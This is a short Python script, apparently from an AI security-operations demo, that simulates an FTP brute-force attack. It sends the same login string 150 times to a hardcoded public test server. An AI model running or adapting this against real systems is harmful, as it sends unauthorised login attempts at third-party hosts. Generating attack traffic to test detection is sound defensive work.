import socket
import time
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import get_logger

log = get_logger(__name__)

def run(target_ip="195.144.107.198", target_port=21, attempts=150): # test.rebex.net
    print("\n=======================================================")
    print("   AI-SOC Demo: FTP/SSH Brute Force Attack")
    print("=======================================================\n")
    log.warning(f"🔴 [ATTACK] Launching Brute Force against {target_ip}:{target_port} ({attempts} attempts)...")
    
    for i in range(attempts):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2.0)
                s.connect((target_ip, target_port))
                # Simulate login packet
                s.sendall(b"USER admin\r\nPASS password123\r\n")
        except (socket.timeout, ConnectionRefusedError):
            pass
        time.sleep(0.02) # Slightly slower than DoS to mimic brute force

    log.info("✅ Brute Force simulation complete.")

if __name__ == "__main__":
    run()
